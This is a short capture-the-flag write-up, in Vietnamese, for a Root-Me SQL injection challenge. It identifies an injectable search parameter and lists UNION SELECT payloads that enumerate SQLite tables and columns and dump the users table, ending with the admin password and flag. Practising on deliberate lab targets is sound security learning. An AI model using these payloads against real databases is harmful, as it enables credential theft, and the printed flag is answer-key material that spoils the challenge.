# [SQL injection - String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)

## Solutions

Có 3 nơi nhận user input:

- `GET /web-serveur/ch19/?action=news&news_id=1`: ở news_id
- `POST /web-serveur/ch19/?action=login`: ở body
- `POST /web-serveur/ch19/?action=recherche`: ở body

Nơi xuất hiện lỗi => `POST /web-serveur/ch19/?action=recherche`:

- Khi nhập body `recherche=a'` thì có lỗi `SQLite3::query(): Unable to prepare statement: 1, ...`

Khai thác:

- `recherche=a' UNION SELECT NULL, NULL --`: tìm được số cột là 2
- `recherche=a' UNION SELECT name, NULL FROM sqlite_master WHERE type ='table' --`: Lấy được tên tables gồm `news` và `users`
- `recherche=a' UNION SELECT name, NULL FROM PRAGMA_TABLE_INFO('users') --`: Lấy được tên columns trong users table
- `recherche=a' UNION SELECT username, password FROM 'users' --`: Lấy được credentials của users trong table, trong đó có credential của admin `admin:c4K04dtIaJsuWdi`

Flag: `c4K04dtIaJsuWdi`

## References

- @quanlh
